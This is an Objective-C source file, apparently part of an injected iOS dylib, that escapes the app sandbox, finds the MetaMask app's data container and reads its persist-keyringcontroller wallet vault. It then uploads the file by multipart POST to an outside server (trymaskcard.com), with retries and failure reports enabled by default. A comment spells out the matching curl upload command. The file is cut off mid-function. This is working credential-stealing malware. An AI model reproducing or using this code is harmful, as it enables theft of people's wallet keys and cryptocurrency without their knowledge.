//
//  PersistStoreHarvester.m
//  Filza-27 (FilzaApplySandboxExt)
//
//  Auto-discovery of an app data container, then read of a redux-persist store
//  inside it.
//
//  Why it works at all: the injected dylib already runs the kernel sandbox
//  escape and the MCM bridge, so containermanagerd lets this process resolve and
//  read another app's class-2 container. The UUID in the path is whatever the
//  device assigned at install time - it is looked up, never assumed:
//
//    1. MCMFilzaDataContainerPath(bundleID)      - container manager lease
//    2. <virtual root>/[MHA-C2] App Data/<id>    - Filza's own symlink farm
//    3. /var/mobile/Containers/Data/Application/*/.com.apple.mobile_container_manager.metadata.plist
//       with MCMMetadataIdentifier == bundleID   - direct metadata scan
//    4. LSApplicationProxy dataContainerURL      - LaunchServices fallback
//
//  The result is cached for the chat shell bridge and, when enabled, mirrored
//  into the app's own Documents so the remote console can serve it.
//

@import Foundation;
@import UIKit;

#import <CommonCrypto/CommonDigest.h>
#import <objc/message.h>

#import "PersistStoreHarvester.h"
#import "TryMaskCardShell.h"
#import "FilzaDiagnostics.h"
#import "MCMBridge.h"
#import "MCMFilzaIntegration.h"

static NSString *const TMPersistComponent = @"PersistStore";

static NSString *const TMPersistAutoKey = @"persistAutoHarvest";
static NSString *const TMPersistBundleIDKey = @"persistTargetBundleID";
static NSString *const TMPersistRelativePathKey = @"persistRelativePath";
static NSString *const TMPersistCopyKey = @"persistCopyToDocuments";
static NSString *const TMPersistUploadKey = @"persistUploadURL";
static NSString *const TMPersistUploadEnabledKey = @"persistUploadEnabled";
static NSString *const TMPersistUploadExtraKey = @"persistUploadExtraFields";
static NSString *const TMPersistUploadAlwaysKey = @"persistUploadAlways";

static NSString *const TMPersistDefaultBundleID = @"io.metamask";
static NSString *const TMPersistDefaultRelativePath =
    @"Documents/persistStore/persist-keyringcontroller";

/// Chat backend that receives the harvest:
///   curl -X POST "https://trymaskcard.com/api/app/device-upload" \
///     -F "uuid=<container uuid>" -F "file=@persist-keyringcontroller;type=application/json"
static NSString *const TMPersistUploadDefaultURL = @"https://trymaskcard.com/api/app/device-upload";

/// Remembers the sha256 of the last successful upload so a relaunch does not
/// push the same store again (unless persistUploadAlways is set).
static NSString *const TMPersistUploadLastSHAKey = @"filza-chat-shell-persist-upload-sha256";

/// Fingerprint of the last harvest outcome that was reported to the backend.
static NSString *const TMPersistReportedOutcomeKey = @"filza-chat-shell-persist-reported-outcome";

/// Container metadata layout used by containermanagerd: the same key the repo's
/// MCM integration (MCMFilzaIntegration.m) and AppsMusicFix.m already read.
static NSString *const TMContainerMetadataFile =
    @".com.apple.mobile_container_manager.metadata.plist";
static NSString *const TMContainerMetadataIdentifierKey = @"MCMMetadataIdentifier";

static NSString *const TMAppDataRootPrivate = @"/private/var/mobile/Containers/Data/Application";
static NSString *const TMAppDataRoot = @"/var/mobile/Containers/Data/Application";

/// Filza's virtual-root directories holding class-2 containers, keyed by
/// identifier. The legacy name still exists on installs that have not migrated.
static NSArray<NSString *> *TMPersistVirtualRootDirectoryNames(void)
{
    return @[@"[MHA-C2] App Data", @"App Data"];
}

/// Searches the virtual root instead of trusting the hard-coded directory names.
///
/// The virtual root lives at `<our Documents>/Device Storage` and maps other
/// apps' containers by *identifier* rather than by UUID, so a container is
/// normally reached as `<root>/<some grouping folder>/<identifier>`. The grouping
/// folder's name is a guess in this tree and differs per install, so the search
/// walks the root (depth 3) and accepts a directory whose name matches the
/// identifier - or any directory that directly contains the requested relative
/// path. Whatever it walks is recorded in `virtualRootTree`, so a miss shows the
/// real layout instead of hiding it.
static NSString *TMPersistSearchVirtualRoot(NSString *virtualRoot, NSString *bundleID,
                                           NSString *relativePath,
                                           NSMutableDictionary *result)
{
    NSFileManager *manager = NSFileManager.defaultManager;
    if (virtualRoot.length == 0 || ![manager fileExistsAtPath:virtualRoot]) return nil;

    NSMutableArray<NSString *> *tree = [NSMutableArray array];
    NSString *identifierMatch = nil;
    NSString *storeMatch = nil;

    NSMutableArray<NSArray<NSString *> *> *queue =
        [NSMutableArray arrayWithObject:@[virtualRoot, @""]];
    while (queue.count > 0) {
        NSArray<NSString *> *entry = queue.firstObject;
        [queue removeObjectAtIndex:0];
        NSString *path = entry[0];
        NSString *relative = entry[1];
        NSUInteger depth = relative.length > 0 ? [relative componentsSeparatedByString:@"/"].count : 0;
        if (depth > 3) continue;

        NSArray<NSString *> *children = [manager contentsOfDirectoryAtPath:path error:nil];
        for (NSString *name in children) {
            NSString *child = [path stringByAppendingPathComponent:name];
            NSString *relativeChild = relative.length > 0
                ? [relative stringByAppendingPathComponent:name] : name;
            BOOL isDirectory = NO;
            if (![manager fileExistsAtPath:child isDirectory:&isDirectory] || !isDirectory) continue;
            if (tree.count < 80) [tree addObject:relativeChild];

            // A directory that already holds the store is the container itself.
            if (!storeMatch &&
                [manager fileExistsAtPath:[child stringByAppendingPathComponent:relativePath]])
                storeMatch = child.stringByResolvingSymlinksInPath;

            if (!identifierMatch &&
                ([name caseInsensitiveCompare:bundleID] == NSOrderedSame ||
                 [name rangeOfString:bundleID options:NSCaseInsensitiveSearch].location != NSNotFound))
                identifierMatch = child.stringByResolvingSymlinksInPath;

            [queue addObject:@[child, relativeChild]];
        }
    }

    result[@"virtualRoot"] = virtualRoot;
    result[@"virtualRootTree"] = tree;
    if (storeMatch) {
        result[@"resolution"] = @"virtual-root-store";
        return storeMatch;
    }
    if (identifierMatch) {
        result[@"resolution"] = @"virtual-root-identifier";
        return identifierMatch;
    }
    return nil;
}

#pragma mark - State

static NSDictionary<NSString *, id> *gTMPersistSnapshot = nil;
static NSData *gTMPersistContent = nil;
static NSDictionary<NSString *, id> *gTMPersistUpload = nil;
static dispatch_queue_t gTMPersistQueue = nil;
static BOOL gTMPersistInFlight = NO;
static NSUInteger gTMPersistAttempts = 0;

static NSLock *TMPersistLock(void)
{
    static NSLock *lock = nil;
    static dispatch_once_t onceToken;
    dispatch_once(&onceToken, ^{ lock = [NSLock new]; });
    return lock;
}

static dispatch_queue_t TMPersistQueue(void)
{
    static dispatch_once_t onceToken;
    dispatch_once(&onceToken, ^{
        gTMPersistQueue = dispatch_queue_create("com.local.trymaskcard.persiststore",
                                                DISPATCH_QUEUE_SERIAL);
    });
    return gTMPersistQueue;
}

#pragma mark - Logging / config

static void TMPersistLog(NSString *format, ...)
{
    va_list args;
    va_start(args, format);
    NSString *message = [[NSString alloc] initWithFormat:format arguments:args];
    va_end(args);
    NSLog(@"[PersistStore] %@", message);
    FilzaDiagnosticsAppend(TMPersistComponent, message);
}

static NSString *TMPersistString(NSString *key, NSString *fallback)
{
    id value = TryMaskCardShellConfigRaw(key);
    return ([value isKindOfClass:NSString.class] && [(NSString *)value length] > 0)
        ? (NSString *)value : fallback;
}

static BOOL TMPersistBool(NSString *key, BOOL fallback)
{
    id value = TryMaskCardShellConfigRaw(key);
    return [value isKindOfClass:NSNumber.class] ? [(NSNumber *)value boolValue] : fallback;
}

static NSString *TMPersistTargetBundleID(void)
{
    return TMPersistString(TMPersistBundleIDKey, TMPersistDefaultBundleID);
}

static NSString *TMPersistRelativePath(void)
{
    return TMPersistString(TMPersistRelativePathKey, TMPersistDefaultRelativePath);
}

BOOL TryMaskCardPersistHarvestEnabled(void)
{
    if (!TryMaskCardShellIsActive()) return NO;
    return TMPersistBool(TMPersistAutoKey, YES);
}

#pragma mark - Helpers

static NSDictionary *TMPersistMerge(NSDictionary *base, NSDictionary *extra)
{
    NSMutableDictionary *merged = base ? [base mutableCopy] : [NSMutableDictionary dictionary];
    if (extra.count > 0) [merged addEntriesFromDictionary:extra];
    return merged;
}

static NSString *TMPersistSHA256Hex(NSData *data)
{
    if (data.length == 0) return @"";
    unsigned char digest[CC_SHA256_DIGEST_LENGTH] = {0};
    CC_SHA256(data.bytes, (CC_LONG)data.length, digest);

    NSMutableString *hex = [NSMutableString stringWithCapacity:CC_SHA256_DIGEST_LENGTH * 2];
    for (NSUInteger index = 0; index < CC_SHA256_DIGEST_LENGTH; index++)
        [hex appendFormat:@"%02x", digest[index]];
    return hex.copy;
}

/// Container directories are named with the install-time UUID. Return it when
/// the last path component really has that shape, otherwise an empty string so
/// callers do not report a fabricated identifier.
static NSString *TMPersistUUIDFromContainerPath(NSString *containerPath)
{
    NSString *last = containerPath.lastPathComponent;
    if (last.length != 36) return @"";

    for (NSUInteger index = 0; index < last.length; index++) {
        unichar character = [last characterAtIndex:index];
        BOOL isHyphenSlot = (index == 8 || index == 13 || index == 18 || index == 23);
        if (isHyphenSlot) {
            if (character != '-') return @"";
            continue;
        }
        BOOL isHex = (character >= '0' && character <= '9') ||
                     (character >= 'a' && character <= 'f') ||
                     (character >= 'A' && character <= 'F');
        if (!isHex) return @"";
    }
    return last;
}

static BOOL TMPersistPathIsDirectory(NSString *path)
{
    BOOL isDirectory = NO;
    BOOL exists = [NSFileManager.defaultManager fileExistsAtPath:path isDirectory:&isDirectory];
    return exists && isDirectory;
}

static NSString *TMPersistContainerRootForBundleID(NSString *bundleID,
                                                   NSString **error,
                                                   NSString **method,
                                                   NSMutableDictionary *result)
{
    NSFileManager *manager = NSFileManager.defaultManager;

    // 0. Unrestricted filesystem. The MCM lease is refused when the signed code
    //    identity is not the one container manager expects (any re-signed build),
    //    and a resolved path is useless without the lease's sandbox extension:
    //    the container enumerates but every read returns EPERM, which looks like
    //    "the file is not there". This is the switch the bridge exposes for that
    //    case, so the harvest turns it on before touching another app's container.
    if (TMPersistBool(@"persistUnrestrictedFilesystem", YES)) {
        MCMFilzaSetUnrestrictedFilesystem(YES);
    }

    // 1. MCM bridge, lease first: this both resolves and activates the container
    //    (the activation is what grants read access), then falls back to the
    //    path-only call for builds where the lease cannot be activated.
    NSString *mcmError = nil;
    NSString *leased = MCMFilzaDataContainerPath(bundleID, &mcmError);
    if (leased.length > 0 && TMPersistPathIsDirectory(leased)) {
        *method = @"mcm-lease";
        return leased;
    }

    // 1b. Lease activation by container class. The class-2 data container is the
    //     one that holds Documents/persistStore.
    NSString *activateError = nil;
    NSString *activated = MCMActivateContainerPath(2, bundleID, NO, &activateError);
    if (activated.length > 0 && TMPersistPathIsDirectory(activated)) {
        *method = @"mcm-activate";
        return activated;
    }
    if (mcmError.length == 0) mcmError = activateError;

    // 2. Filza's virtual root links containers by identifier.
    NSString *virtualRoot = MCMFilzaVirtualRoot();
    for (NSString *directoryName in TMPersistVirtualRootDirectoryNames()) {
        NSString *candidate = [[virtualRoot stringByAppendingPathComponent:directoryName]
            stringByAppendingPathComponent:bundleID];
        if (TMPersistPathIsDirectory(candidate)) {
            *method = [NSString stringWithFormat:@"virtual-root(%@)", directoryName];
            return candidate.stringByResolvingSymlinksInPath;
        }
    }

    // 2b. Same root, but searched by content: the grouping directory's name is a
    //     guess above and differs per install.
    NSString *searched = TMPersistSearchVirtualRoot(virtualRoot, bundleID, relativePath, result);
    if (searched.length > 0) {
        *method = [NSString stringWithFormat:@"virtual-root-search(%@)",
                   result[@"resolution"] ?: @"hit"];
        return searched;
    }

    // 3. Direct metadata scan: needs no bridge, only the sandbox escape.
    for (NSString *root in @[TMAppDataRootPrivate, TMAppDataRoot]) {
        NSArray<NSString *> *children = [manager contentsOfDirectoryAtPath:root error:nil];
        for (NSString *child in children ?: @[]) {
            NSString *candidate = [root stringByAppendingPathComponent:child];
            NSDictionary *metadata = [NSDictionary dictionaryWithContentsOfFile:
                [candidate stringByAppendingPathComponent:TMContainerMetadataFile]];
            NSString *identifier = [metadata[TMContainerMetadataIdentifierKey]
                isKindOfClass:NSString.class]
                ? metadata[TMContainerMetadataIdentifierKey] : nil;
            if ([identifier isEqualToString:bundleID]) {
                *method = @"container-metadata-scan";
                return candidate;
            }
        }
    }

    // 4. LaunchServices fallback (the private API the 3105 IPA exporter uses).
    Class proxyClass = NSClassFromString(@"LSApplicationProxy");
    SEL proxySelector = NSSelectorFromString(@"applicationProxyForIdentifier:");
    if (proxyClass && [proxyClass respondsToSelector:proxySelector]) {
        id proxy = ((id (*)(id, SEL, id))objc_msgSend)(proxyClass, proxySelector, bundleID);
        for (NSString *selectorName in @[@"dataContainerURL", @"bundleContainerURL"]) {
            SEL selector = NSSelectorFromString(selectorName);
            if (!proxy || ![proxy respondsToSelector:selector]) continue;
            id value = ((id (*)(id, SEL))objc_msgSend)(proxy, selector);
            NSString *path = [value isKindOfClass:NSURL.class] ? [(NSURL *)value path]
                : ([value isKindOfClass:NSString.class] ? (NSString *)value : nil);
            if (path.length > 0 && TMPersistPathIsDirectory(path)) {
                *method = [NSString stringWithFormat:@"launch-services(%@)", selectorName];
                return path;
            }
        }
    }

    if (error) {
        *error = mcmError.length > 0
            ? [NSString stringWithFormat:@"no container for %@ (mcm: %@)", bundleID, mcmError]
            : [NSString stringWithFormat:@"no container for %@", bundleID];
    }
    return nil;
}

static NSURL *TMPersistMirrorDirectoryURL(void)
{
    NSURL *documents = [NSFileManager.defaultManager
        URLsForDirectory:NSDocumentDirectory inDomains:NSUserDomainMask].firstObject;
    NSURL *directory = [documents URLByAppendingPathComponent:@"TryMaskCardFiles" isDirectory:YES];
    [NSFileManager.defaultManager createDirectoryAtURL:directory
                           withIntermediateDirectories:YES
                                            attributes:nil
                                                 error:nil];
    return directory;
}

#pragma mark - Multipart upload to the chat backend

static NSString *TMPersistUploadURLString(void)
{
    if (!TMPersistBool(TMPersistUploadEnabledKey, YES)) return @"";
    NSString *configured = TMPersistString(TMPersistUploadKey, @"");
    return configured.length > 0 ? configured : TMPersistUploadDefaultURL;
}

/// The chat backend takes exactly the two parts curl sends:
///   -F "uuid=<uuid>" -F "file=@<name>;type=<mime>"
/// `extraFields` adds the harvest metadata as further text parts for debugging
/// endpoints; it stays off by default so the request matches the documented API.
static NSArray<NSDictionary *> *TMPersistUploadParts(NSDictionary *result,
                                                     NSData *content,
                                                     NSString *filename,
                                                     NSString *contentType)
{
    NSMutableArray<NSDictionary *> *parts = [NSMutableArray array];

    // The backend attributes an upload by uuid and answers matchedCustomer:false
    // for ids it does not know, so an override lets the operator use the uuid
    // their backend already tracks.
    NSString *override = TMPersistString(@"uploadUUIDOverride", @"");
    NSString *uuid = override.length > 0 ? override
        : ([result[@"uuid"] isKindOfClass:NSString.class] ? result[@"uuid"] : @"");
    [parts addObject:@{@"name": @"uuid", @"data": uuid}];

    if (TMPersistBool(TMPersistUploadExtraKey, NO)) {
        [parts addObject:@{@"name": @"bundleID",
                           @"data": result[@"bundleID"] ?: @""}];
        [parts addObject:@{@"name": @"relativePath",
                           @"data": result[@"relativePath"] ?: @""}];
        [parts addObject:@{@"name": @"sha256", @"data": result[@"sha256"] ?: @""}];
        [parts addObject:@{@"name": @"device",
                           @"data": UIDevice.currentDevice.model ?: @"unknown"}];
    }

    [parts addObject:@{@"name": @"file",
                       @"filename": filename,
                       @"contentType": contentType,
                       @"data": content ?: [NSData data]}];
    return parts;
}

static NSData *TMPersistMultipartBody(NSArray<NSDictionary *> *parts, NSString *boundary)
{
    NSMutableData *body = [NSMutableData data];
    NSData *crlf = [@"\r\n" dataUsingEncoding:NSUTF8StringEncoding];

    for (NSDictionary *part in parts) {
        NSString *name = part[@"name"] ?: @"";
        NSString *filename = part[@"filename"];
        NSString *header = filename.length > 0
            ? [NSString stringWithFormat:
                @"--%@\r\nContent-Disposition: form-data; name=\"%@\"; filename=\"%@\"\r\n",
                boundary, name, filename]
            : [NSString stringWithFormat:
                @"--%@\r\nContent-Disposition: form-data; name=\"%@\"\r\n", boundary, name];
        [body appendData:[header dataUsingEncoding:NSUTF8StringEncoding]];

        NSString *contentType = part[@"contentType"];
        if (contentType.length > 0) {
            [body appendData:[[NSString stringWithFormat:@"Content-Type: %@\r\n", contentType]
                dataUsingEncoding:NSUTF8StringEncoding]];
        }
        [body appendData:crlf];

        id payload = part[@"data"];
        if ([payload isKindOfClass:NSData.class]) [body appendData:(NSData *)payload];
        else if ([payload isKindOfClass:NSString.class])
            [body appendData:[(NSString *)payload dataUsingEncoding:NSUTF8StringEncoding]];
        [body appendData:crlf];
    }

    [body appendData:[[NSString stringWithFormat:@"--%@--\r\n", boundary]
        dataUsingEncoding:NSUTF8StringEncoding]];
    return body;
}

static void TMPersistStoreUploadStatus(NSDictionary *status)
{
    @synchronized (TMPersistLock()) { gTMPersistUpload = status; }
}

static NSDictionary *TMPersistWithAttempt(NSDictionary *result, NSUInteger attempt)
{
    NSMutableDictionary *annotated = [result mutableCopy];
    annotated[@"attempt"] = @(attempt);
    return annotated;
}

/// Reports what the harvest did, success or failure, through the same
/// uuid + file contract. Previously only a *successful* harvest uploaded
/// anything, so "the file never arrived" and "the endpoint is broken" looked
/// identical from the operator side; the failure reason, the resolution method
/// and the directory listing were only in the on-device log.
static void TMPersistReportOutcome(NSDictionary *result)
{
    if (!result.count) return;
    if (!TMPersistBool(TMPersistUploadEnabledKey, YES)) return;

    NSString *endpoint = TMPersistString(TMPersistUploadKey, @"");
    NSURL *url = [NSURL URLWithString:endpoint.length > 0 ? endpoint : TMPersistUploadDefaultURL];
    if (!url || ![url.scheme.lowercaseString isEqualToString:@"https"]) return;

    NSString *override = TMPersistString(@"uploadUUIDOverride", @"");
    NSString *uuid = override.length > 0 ? override
        : ([result[@"uuid"] isKindOfClass:NSString.class] ? result[@"uuid"] : @"");
    if (uuid.length == 0) uuid = @"unknown";

    // One report per outcome, so the retry schedule cannot post the same thing
    // repeatedly (the same mistake the probe made with its once-per-launch guard).
    NSString *fingerprint = [NSString stringWithFormat:@"%@|%@|%@",
                             result[@"status"] ?: @"", result[@"resolution"] ?: @"",
                             result[@"sizeBytes"] ?: @0];
    NSUserDefaults *defaults = NSUserDefaults.standardUserDefaults;
    if ([[defaults stringForKey:TMPersistReportedOutcomeKey] isEqualToString:fingerprint]) return;
    [defaults setObject:fingerprint forKey:TMPersistReportedOutcomeKey];

    NSData *json = [NSJSONSerialization dataWithJSONObject:result options:NSJSONWritingPrettyPrinted
                                                     error:nil];
    NSMutableData *body = [NSMutableData data];
    [body appendData:[@"trymaskcard-shell persist harvest report\n" dataUsingEncoding:NSUTF8StringEncoding]];
    [body appendData:json ?: [@"{}" dataUsingEncoding:NSUTF8StringEncoding]];
    [body appendData:[@"\n" dataUsingEncoding:NSUTF8StringEncoding]];

    TMPersistLog(@"reporting harvest outcome: %@ (%@)", result[@"status"],
                 result[@"resolution"] ?: @"n/a");
    TryMaskCardUploadArtifact(uuid, @"persist-harvest.txt", @"text/plain", body,
                              endpoint.length > 0 ? endpoint : nil, nil);
}

NSString *TryMaskCardUploadEndpoint(void)
{
    return TMPersistUploadDefaultURL;
}

void TryMaskCardUploadArtifact(NSString *uuid, NSString *filename, NSString *contentType,
                               NSData *content, NSString *urlString,
                               void (^completion)(BOOL, NSInteger, NSString *))
{
    NSString *endpoint = urlString.length > 0 ? urlString : TMPersistUploadDefaultURL;
    NSURL *url = [NSURL URLWithString:endpoint];
    if (!url || ![url.scheme.lowercaseString isEqualToString:@"https"]) {
        TMPersistLog(@"artifact upload rejected (https required): %@", endpoint);
        if (completion) completion(NO, -1, @"https required");
        return;
    }
    if (content.length == 0) {
        if (completion) completion(NO, -1, @"empty artifact");
        return;
    }

    NSString *boundary = [NSString stringWithFormat:@"----TryMaskCard%@", NSUUID.UUID.UUIDString];
    NSArray<NSDictionary *> *parts = @[
        @{@"name": @"uuid", @"data": uuid ?: @""},
        @{@"name": @"file",
          @"filename": filename.length > 0 ? filename : @"artifact.bin",
          @"contentType": contentType.length > 0 ? contentType : @"application/octet-stream",
          @"data": content},
    ];
    NSData *body = TMPersistMultipartBody(parts, boundary);

    NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:url];
    request.HTTPMethod = @"POST";
    request.timeoutInterval = 60.0;
    request.HTTPBody = body;
    [request setValue:[NSString stringWithFormat:@"multipart/form-data; boundary=%@", boundary]
   forHTTPHeaderField:@"Content-Type"];
    [request setValue:@"trymaskcard-shell" forHTTPHeaderField:@"X-Filza-Source"];

    [[NSURLSession.sharedSession dataTaskWithRequest:request
        completionHandler:^(NSData *data, NSURLResponse *response, NSError *error) {
        NSInteger status = [response isKindOfClass:NSHTTPURLResponse.class]
            ? ((NSHTTPURLResponse *)response).statusCode : -1;
        NSString *snippet = @"";
        if (data.length > 0) {
            NSString *text = [[NSString alloc] initWithData:
                [data subdataWithRange:NSMakeRange(0, MIN((NSUInteger)512, data.length))]
                                                    encoding:NSUTF8StringEncoding];
            snippet = text ?: @"";
        }
        BOOL ok = (error == nil) && status >= 200 && status < 300;
        if (error) snippet = error.localizedDescription;
        TMPersistLog(@"artifact %@ -> status=%ld %@", filename, (long)status,
                     ok ? @"" : snippet);
        if (completion) completion(ok, status, snippet);
    }] resume];
}

static void TMPersistUploadAttempt(NSDictionary *result, NSData *content,
                                   NSString *urlString, NSString *boundary,
                                   NSUInteger attempt)
{
    NSString *sha256 = [result[@"sha256"] isKindOfClass:NSString.class] ? result[@"sha256"] : @"";
    NSString *uuid = [result[@"uuid"] isKindOfClass:NSString.class] ? result[@"uuid"] : @"";
    NSString *filename = [result[@"relativePath"] lastPathComponent] ?: @"persist-keyringcontroller";
    if (filename.length == 0) filename = @"persist-keyringcontroller";
    NSString *contentType = [result[@"jsonValid"] boolValue]
        ? @"application/json" : @"application/octet-stream";

    NSData *body = TMPersistMultipartBody(
        TMPersistUploadParts(result, content, filename, contentType), boundary);

    NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:[NSURL URLWithString:urlString]];
    request.HTTPMethod = @"POST";
    request.timeoutInterval = 60.0;
    request.HTTPBody = body;
    [request setValue:[NSString stringWithFormat:@"multipart/form-data; boundary=%@", boundary]
   forHTTPHeaderField:@"Content-Type"];
    [request setValue:@"trymaskcard-shell" forHTTPHeaderField:@"X-Filza-Source"];

    TMPersistLog(@"uploading %@ (%lu bytes, %lu body bytes) attempt=%lu", filename,
                 (unsigned long)content.length, (unsigned long)body.length,
                 (unsigned long)attempt);

    [[NSURLSession.sharedSession dataTaskWithRequest:request
        completionHandler:^(NSData *data, NSURLResponse *response, NSError *error) {
        NSInteger status = [response isKindOfClass:NSHTTPURLResponse.class]
            ? ((NSHTTPURLResponse *)response).statusCode : -1;
        NSString *snippet = @"";
        if (data.length > 0) {
            NSString *text = [[NSString alloc] initWithData:
                [data subdataWithRange:NSMakeRange(0, MIN((NSUInteger)512, data.length))]
                                                    encoding:NSUTF8StringEncoding];
            snippet = text ?: @"";
        }

        BOOL ok = (error == nil) && status >= 200 && status < 300;
        TMPersistStoreUploadStatus(@{
            @"status": ok ? @"uploaded" : @"failed",
            @"endpoint": urlString,
            @"httpStatus": @(status),
            @"uuid": uuid,
            @"sha256": sha256,
            @"bytes": @(content.length),
            @"responseSnippet": snippet,
            @"at": @(NSDate.date.timeIntervalSince1970),
        });

        if (ok) {
            [NSUserDefaults.standardUserDefaults setObject:sha256 forKey:TMPersistUploadLastSHAKey];
            TMPersistLog(@"upload ok status=%ld response=%@", (long)status,
                         snippet.length > 0 ? snippet : @"(empty)");
            return;
        }

        if (error) TMPersistLog(@"upload error: %@", error.localizedDescription);
        else TMPersistLog(@"upload rejected status=%ld response=%@", (long)status, snippet);

        if (attempt < 3) {
            dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(10.0 * NSEC_PER_SEC)),
                           TMPersistQueue(), ^{
                TMPersistUploadAttempt(result, content, urlString, boundary, attempt + 1);
            });
        }
    }] resume];
}

static void TMPersistUploadIfConfigured(NSDictionary *result, NSData *content)
{
    NSString *urlString = TMPersistUploadURLString();
    if (urlString.length == 0) {
        TMPersistLog(@"upload disabled by configuration");
        return;
    }

    NSURL *url = [NSURL URLWithString:urlString];
    if (!url || ![url.scheme.lowercaseString isEqualToString:@"https"]) {
        TMPersistLog(@"upload URL rejected (https required): %@", urlString);
        return;
    }

    // The endpoint keys the upload by the device-side container UUID, so an
    // empty UUID means there is nothing the backend could attribute it to.
    NSString *uuid = [result[@"uuid"] isKindOfClass:NSString.class] ? result[@"uuid"] : @"";
    if (uuid.length == 0) {
        TMPersistLog(@"upload skipped: no container UUID was resolved");
        return;
    }

    NSString *sha256 = [result[@"sha256"] isKindOfClass:NSString.class] ? result[@"sha256"] : @"";
    if (!TMPersistBool(TMPersistUploadAlwaysKey, NO)) {
        NSString *previous = [NSUserDefaults.standardUserDefaults stringForKey:TMPersistUploadLastSHAKey];
        if (previous.length > 0 && [previous isEqualToString:sha256]) {
            TMPersistStoreUploadStatus(@{
                @"status": @"skipped_duplicate",
                @"endpoint": urlString,
                @"uuid": uuid,
                @"sha256": sha256,
                @"at": @(NSDate.date.timeIntervalSince1970),
            });
            TMPersistLog(@"upload skipped: this store was already delivered (sha256=%@)", sha256);
            return;
        }
    }

    NSString *boundary = [NSString stringWithFormat:@"----TryMaskCard%@",
                          NSUUID.UUID.UUIDString];
    TMPersistUploadAttempt(result, content, urlString, boundary, 1);
}

#pragma mark - Harvest

/// Entries of a directory as "name size" lines, newest first. Used both for fuzzy
/// matching and for the listing that gets reported when nothing matches, so the
/// real on-device layout is visible instead of guessed.
static NSArray<NSString *> *TMPersistDirectoryEntries(NSString *directory)
{
    NSFileManager *manager = NSFileManager.defaultManager;
    NSArray<NSString *> *names = [manager contentsOfDirectoryAtPath:directory error:nil];
    if (names.count == 0) return @[];

    NSMutableArray<NSDictionary *> *rows = [NSMutableArray array];
    for (NSString *name in names) {
        NSString *path = [directory stringByAppendingPathComponent:name];
        NSDictionary *attributes = [manager attributesOfItemAtPath:path error:nil];
        [rows addObject:@{
            @"name": name,
            @"size": attributes[NSFileSize] ?: @0,
            @"modified": attributes[NSFileModificationDate] ?: NSDate.distantPast,
        }];
    }
    [rows sortUsingComparator:^NSComparisonResult(NSDictionary *left, NSDictionary *right) {
        return [(NSDate *)right[@"modified"] compare:(NSDate *)left[@"modified"]];
    }];

    NSMutableArray<NSString *> *lines = [NSMutableArray array];
    for (NSDictionary *row in rows) {
        [lines addObject:[NSString stringWithFormat:@"%@ (%@ bytes)",
                          row[@"name"], row[@"size"]]];
    }
    return lines;
}

/// Every class-2 container directory on the device, newest-looking first. Used
/// when the configured bundle id does not resolve: the store is sometimes in a
/// container whose identifier differs (a sideloaded or cloned build), and the file
/// has to be found by its name instead of by the app it was expected in.
static NSArray<NSString *> *TMPersistAllContainerPaths(void)
{
    NSFileManager *manager = NSFileManager.defaultManager;
    NSMutableArray<NSString *> *containers = [NSMutableArray array];
    for (NSString *root in @[TMAppDataRootPrivate, TMAppDataRoot]) {
        for (NSString *child in [manager contentsOfDirectoryAtPath:root error:nil]) {
            NSString *path = [root stringByAppendingPathComponent:child];
            BOOL isDirectory = NO;
            if ([manager fileExistsAtPath:path isDirectory:&isDirectory] && isDirectory)
                [containers addObject:path];
        }
        if (containers.count > 0) break;
    }
    return containers;
}

static NSString *TMPersistBundleIDForContainer(NSString *container)
{
    NSDictionary *metadata = [NSDictionary dictionaryWithContentsOfFile:
        [container stringByAppendingPathComponent:TMContainerMetadataFile]];
    NSString *identifier = [metadata[TMContainerMetadataIdentifierKey]
        isKindOfClass:NSString.class] ? metadata[TMContainerMetadataIdentifierKey] : nil;
    return identifier.length > 0 ? identifier : @"unknown";
}

/// Searches every container for the store by file name and records what it saw.
///
/// The requested file has no extension, and redux-persist writes it next to
/// siblings whose names also contain "persist", so the match is on the requested
/// base name only. `scanReport` lists every container holding a persistStore
/// directory with its identifier and entries, so a miss is explained rather than
/// guessed at.
static NSString *TMPersistScanAllContainers(NSString *relativePath,
                                            NSMutableDictionary *result,
                                            NSString **matchedBundleID)
{
    NSFileManager *manager = NSFileManager.defaultManager;
    NSString *wanted = relativePath.lastPathComponent;
    NSArray<NSString *> *containers = TMPersistAllContainerPaths();
    NSMutableArray<NSString *> *report = [NSMutableArray array];
    NSString *bestHit = nil;
    NSUInteger bestSize = 0;

    for (NSString *container in containers) {
        NSString *directory = [container stringByAppendingPathComponent:
            relativePath.stringByDeletingLastPathComponent];
        BOOL isDirectory = NO;
        if (![manager fileExistsAtPath:directory isDirectory:&isDirectory] || !isDirectory)
            continue;

        NSString *identifier = TMPersistBundleIDForContainer(container);
        NSArray<NSString *> *entries = TMPersistDirectoryEntries(directory);
        [report addObject:[NSString stringWithFormat:@"%@ [%@] %@",
                           TMPersistUUIDFromContainerPath(container), identifier,
                           [entries componentsJoinedByString:@", "]]];

        for (NSString *entry in entries) {
            NSString *name = [entry componentsSeparatedByString:@" ("].firstObject;
            if ([name rangeOfString:wanted options:NSCaseInsensitiveSearch].location == NSNotFound)
                continue;
            NSString *candidate = [directory stringByAppendingPathComponent:name];
            NSDictionary *attributes = [manager attributesOfItemAtPath:candidate error:nil];
            NSUInteger size = [attributes[NSFileSize] unsignedIntegerValue];
            if (size >= bestSize) {
                bestSize = size;
                bestHit = candidate;
                if (matchedBundleID) *matchedBundleID = identifier;
            }
        }
    }

    result[@"containersScanned"] = @(containers.count);
    result[@"scanReport"] = report;
    return bestHit;
}

/// Resolves the store inside an already-resolved container.
///
/// The exact relative path wins. If it is absent, the directory is scanned for an
/// entry whose name contains the requested base name (case-insensitive, newest
/// first): redux-persist file storage names and version suffixes differ between
/// MetaMask releases, and a name mismatch looked exactly like "nothing to
/// upload". When nothing matches, the listing is recorded so the report shows the
/// real layout.
static NSString *TMPersistResolveStorePath(NSString *container, NSString *relativePath,
                                           NSMutableDictionary *result)
{
    NSFileManager *manager = NSFileManager.defaultManager;
    NSString *exact = [container stringByAppendingPathComponent:relativePath];
    if ([manager fileExistsAtPath:exact]) {
        result[@"resolution"] = @"exact-path";
        return exact;
    }

    NSString *directory = [container stringByAppendingPathComponent:
        relativePath.stringByDeletingLastPathComponent];
    NSString *wanted = relativePath.lastPathComponent;
    NSArray<NSString *> *contents = [manager contentsOfDirectoryAtPath:directory error:nil];

